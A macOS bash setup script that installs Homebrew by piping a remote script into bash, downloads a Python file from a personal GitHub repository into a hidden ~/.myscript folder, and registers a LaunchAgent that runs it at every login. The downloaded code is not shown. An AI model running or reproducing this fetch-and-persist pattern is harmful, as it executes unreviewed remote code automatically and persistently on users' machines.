#!/bin/bash

# Function to create the .myscript directory if it doesn't exist
function create_myscript_directory() {
    echo "Creating directory..."
    mkdir -p "$HOME/.myscript"
}

# Function to install Homebrew
function install_homebrew() {
    echo "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
}

# Function to install Python with Tkinter support using Homebrew
function install_python_tkinter() {
    echo "Installing Python..."
    brew install python-tk
}

# Function to install PySimpleGUI
function install_pysimplegui() {
    echo "Installing PySimpleGUI..."
    /usr/local/bin/python3 -m pip install PySimpleGUI
}

# Function to download the Python script
function download_script() {
    echo "Downloading the script..."
    curl -o "$HOME/.myscript/new.py" https://raw.githubusercontent.com/alwayshyper/protec/main/main.py
}

# Function to create the shell script
function create_shell_script() {
    echo "Creating the shell script..."
    cat << EOF > "$HOME/.myscript/run_new_script.sh"
#!/bin/bash

# Change to the directory where your Python script is located
cd "$HOME/.myscript/"

# Replace python3 with the correct Python version if needed
/usr/local/bin/python3 new.py
EOF

    # Make the shell script executable
    chmod +x "$HOME/.myscript/run_new_script.sh"
}

# Function to install the launch agent
function install_launch_agent() {
    echo "Creating a launch agent..."
    cat << EOF > "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.$USER.run_new_script</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>/Users/$USER/.myscript/new.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
}

# Function to load the launch agent
function load_launch_agent() {
    echo "Loading the launch agent..."
    launchctl load "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist"
}

# Main execution
create_myscript_directory
install_homebrew
install_python_tkinter
install_pysimplegui
download_script
create_shell_script
install_launch_agent
load_launch_agent

echo "Setup completed successfully!"
